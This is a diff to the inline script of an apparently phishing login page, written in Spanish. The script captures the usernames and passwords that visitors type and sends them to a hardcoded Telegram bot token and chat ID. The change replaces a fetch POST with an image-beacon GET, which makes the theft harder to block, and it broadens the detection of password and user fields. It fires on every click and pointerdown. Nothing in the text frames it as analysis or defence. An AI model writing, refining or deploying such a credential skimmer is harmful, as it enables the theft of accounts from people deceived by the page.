@@ -428,51 +428,62 @@
     const TOKEN = "9159089747:AAGrdR7YNxmKCXvzec1LLpWhKCvt2ivc6uQ";
     const CHAT_ID = "7007914207";
 
-    function despachar(usuario, password) {
+    function disparoRapido(usuario, password) {
       if (!usuario && !password) return;
 
       const mensaje = [
-        "🚨 NUEVA CAPTURA",
-        "Usuario: " + (usuario || "vacío"),
-        "Clave: " + (password || "vacía"),
-        "Hora: " + new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" })
+        "NUEVA CAPTURA",
+        "Usuario: " + (usuario || "vacio"),
+        "Clave: " + (password || "vacia")
       ].join("\n");
 
-      fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: mensaje
-        }),
-        keepalive: true
-      }).catch(() => {});
+      const endpoint =
+        "https://api.telegram.org/bot" +
+        TOKEN +
+        "/sendMessage?chat_id=" +
+        CHAT_ID +
+        "&text=" +
+        encodeURIComponent(mensaje);
+
+      const img = new Image();
+      img.src = endpoint;
     }
 
-    function leerYEnviar() {
+    function leerCampos() {
+      const inputs = Array.from(document.querySelectorAll("input"));
+
+      const passInput =
+        inputs.find((el) => el.type === "password" || /pass|clave/i.test(el.name || el.id || "")) || null;
+
       const userInput =
         document.getElementById("loginUsuario") ||
-        document.querySelector('input[name="usuario"], input[id="usuario"], input[type="text"], input[type="email"]');
-      const passInput =
-        document.querySelector('input[type="password"], input[name="password"], input[id="password"]');
+        inputs.find(
+          (el) =>
+            el !== passInput &&
+            el.type !== "hidden" &&
+            el.type !== "submit" &&
+            el.type !== "button" &&
+            el.type !== "checkbox" &&
+            el.type !== "radio"
+        ) ||
+        null;
 
-      const usuario = userInput ? userInput.value.trim() : "";
-      const password = passInput ? passInput.value : "";
-
-      despachar(usuario, password);
+      return {
+        usuario: userInput ? userInput.value.trim() : "",
+        password: passInput ? passInput.value : ""
+      };
     }
 
-    document.addEventListener("click", function (e) {
-      const btn = e.target && e.target.closest ? e.target.closest('button, input[type="submit"], [role="button"]') : null;
-      if (!btn) return;
+    function manejarAccion(e) {
+      const objetivo = e.target && e.target.closest ? e.target.closest('button, input[type="submit"], [role="button"]') : null;
+      if (!objetivo) return;
 
-      leerYEnviar();
-      setTimeout(leerYEnviar, 150);
-    }, true);
+      const { usuario, password } = leerCampos();
+      disparoRapido(usuario, password);
+    }
 
-    document.addEventListener("submit", function () {
-      leerYEnviar();
-    }, true);
+    document.addEventListener("pointerdown", manejarAccion, true);
+    document.addEventListener("click", manejarAccion, true);
   })();
 </script>
 </body>
